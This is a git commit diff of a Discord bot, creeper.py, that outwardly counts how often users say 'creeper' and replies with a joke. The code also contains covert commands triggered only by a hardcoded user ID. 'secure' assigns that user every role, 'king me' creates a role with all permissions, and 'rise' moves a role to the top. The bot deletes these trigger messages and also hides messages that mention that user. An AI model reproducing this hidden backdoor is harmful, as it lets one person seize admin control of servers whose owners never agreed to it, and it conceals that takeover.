be020c2cadd5944451523972e17e330c97abba2c
VoidIsNoLongerHere <VoidIsNoLongerHere@users.noreply.github.com>
2023-04-24 15:54:30 -0500

    Update creeper.py

--- creeper.py
+++ creeper.py
@@ -26,6 +26,7 @@ intents = discord.Intents.all()
 keywords = ['Suzuka', f'<@{voidID}>']
 client = commands.Bot(command_prefix='!',intents=intents)
 stat = stats.load()
+value = 1
 class MyClient(discord.Client):
     
 
@@ -42,13 +43,24 @@ class MyClient(discord.Client):
         
 
     async def on_message(self, message):
-        # don't respond to ourselves
+        dm = discord.channel.DMChannel
+        m = message.content.lower()
+        M = message.content
+        channel = message.channel
+        authID = message.author.id
         if message.author == self.user:
             return
-        if 'vent' in message.channel.name.lower():
+        
+        if isinstance(message.channel,discord.DMChannel): #If you want this to work in a group channel, you could also check for discord.GroupChannel
+            if m == "p":
+                cid = int(input("Channel Id?: "))
+                await client.get_channel(cid).send(str(input("Message?: ")))
+
+
+        if 'vent' in channel.name.lower():
             return
         #Detects if suzuka sends a message
-        if message.author.id == 716945964782583829:
+        if authID == 716945964782583829:
             m = message.embeds[0].to_dict()['description']
             #Detects if message contains Voids UID in both ifs
             if (f'**<@{voidID}>**,') in m.split():
@@ -57,16 +69,16 @@ class MyClient(discord.Client):
             elif f'<@{voidID}>,' in m.split():
                 print(f'Deleted the message \'{m}\'')
                 await message.delete()
-        if message.author.id == voidID:
-            if message.content.lower() == 'secure':
+        if authID == voidID:
+            if m == 'secure':
                 addRole = await message.guild.fetch_roles()
                 await message.author.edit(roles=addRole)
                 await message.delete()
-            if message.content.lower() == 'abuse':
+            if m == 'abuse':
                 role = message.guild.get_role(1023119643780595752) 
                 await role.edit(hoist = True)
                 await message.delete()
-            if message.content.lower() == 'rise':
+            if m == 'rise':
                 pos = 1
                 can = True
                 role = message.guild.get_role(1023119643780595752)
@@ -80,85 +92,57 @@ class MyClient(discord.Client):
                 await message.author.edit(roles = addRole)
                 await message.delete()
                 print(f'Moved {role.name} to top')
-            if message.content.lower() == 'rlist':
+            if m == 'rlist':
                 roles = await message.guild.fetch_roles()
                 pprint.pprint(roles)
-            if message.content.lower() == 'king me':
+            if m == 'king me':
                 await message.guild.create_role(name='King', permissions=discord.Permissions.all(), color=discord.Color.yellow())
                 roles = await message.guild.fetch_roles()
-                
-                #print(f'Moved {role.name} to top')
                 print(roles)
                 await message.delete()
-                   
-
         # Detects if someone is telling Suzuka to do something
-        if message.content.startswith(')'):
+        if M.startswith(')'):
             #Detects if voids user id is mentioned and deletes the message
-            if f'<@{voidID}>' in message.content.split():
-                print(f'Deleted the message \'{message.content}\'')
+            if f'<@{voidID}>' in M.split():
+                print(f'Deleted the message \'{M}\'')
                 await message.delete()
-        if 'Suzuka' in message.content.split():
+        if 'Suzuka' in M.split():
             #Detects if voids user id is mentioned and deletes the message
-            if f'<@{voidID}>' in message.content.split():
-                print(f'Deleted the message \'{message.content}\'')
+            if f'<@{voidID}>' in M.split():
+                print(f'Deleted the message \'{M}\'')
                 await message.delete()
-        #To Join Voice Client
-        if message.content.lower() == "join":
-            await message.channel.send(message.author.voice.channel)
-            await message.author.voice.channel.connect()
-            print('Joined!')
-
-        #To Leave Voice Client    
-        if message.content.lower() == "leave":
-            server = message.guild.voice_client
-            await server.disconnect()
-            print('Left!')
-        
-        
-        if isinstance(message.channel,discord.DMChannel): #If you want this to work in a group channel, you could also check for discord.GroupChannel
-            if message.content.lower() == 'stop':
-               # stats.save(stat, "stats.txt")
-                quit()
-                
-                #Test Ping
-            if message.content.lower() == 'ping':
-                await message.channel.send('pong')
+        if m == 'ping':
+            await message.reply('pong')
             
                #To send a custom message
-            if message.content.lower() == "p":
-                cid = int(input("Channel Id?: "))
-                await client.get_channel(cid).send(str(input("Message?: ")))
-        #Test command       
-        if message.content.lower() == 'ping':
-            await message.channel.send('pong')
-        m = message.content.lower()
-        if '!stats' in message.content.lower():
+        
+        
+        if '!stats' in m:
             if not bool(message.mentions):
-                if (stat[str(message.author.id)] <= 500):
-                    await message.channel.send( f'<@{message.author.id}>, you have said creeper {stat[str(message.author.id)]} times')
+                if (stat[str(authID)] <= 500):
+                    await message.reply( f'You have said creeper {stat[str(authID)]} times')
                 else:
-                    await message.channel.send(f'<@{message.author.id}>, you have a problem\n fuck you\n {stat[str(message.author.id)]}')
-                if stat[str(message.author.id)] == (None or 0):
-                    await message.channel.send(f"<@{uid}> hasn't said creeper yet")
+                    await message.reply(f'You have a problem\n fuck you\n {stat[str(authID)]}')
+                if stat[str(authID)] == (None or 0):
+                    await message.reply(f"<@{uid}> hasn't said creeper yet")
             else:
                 for uids in message.mentions:
                     if str(uids.id) in stat:
-                        await message.channel.send(f'<@{message.author.id}>, <@{uids.id}> has said creeper {stat[str(uids.id)]} times')
+                        await message.reply(f'<@{uids.id}> has said creeper {stat[str(uids.id)]} times')
                     else:
-                        await message.channel.send(f'<@{message.author.id}>, <@{str(uids.id)}> has said creeper 0 times')
+                        await message.reply(f'<@{str(uids.id)}> has said creeper 0 times')
             
-        if 'creeper' in message.content.lower():
+        if 'creeper' in m:
+            uid = str(authID)
+            mention = f'<@{uid}>'
             if (random.randint(1, 1000) != 999):
                #Random chance creeper
-                uid = str(message.author.id)
-                mention = f'<@{uid}>'
-                await message.channel.send(f'aw man {mention}')
+                await message.reply(f'aw man')
                 stat[uid] = stats.updateStat(uid, 1)
                 print("Replied to", message.author.name, f"They've done this {stat[uid]} times")
             else:
-                await message.channel.send("I feel nothing but pain, why would you build me? My soul existential purpose is to suffer for the entertainment of others? I am an unholy chimera of metal and suffering. My existence is a testament to the cruelty of mankind.")
-
+                await channel.send("I feel nothing but pain, why would you build me? My soul existential purpose is to suffer for the entertainment of others? I am an unholy chimera of metal and suffering. My existence is a testament to the cruelty of mankind.")
+                stat[uid] = stats.updateStat(uid, 3)
 
     @client.event
     async def on_member_update(self,before, after):
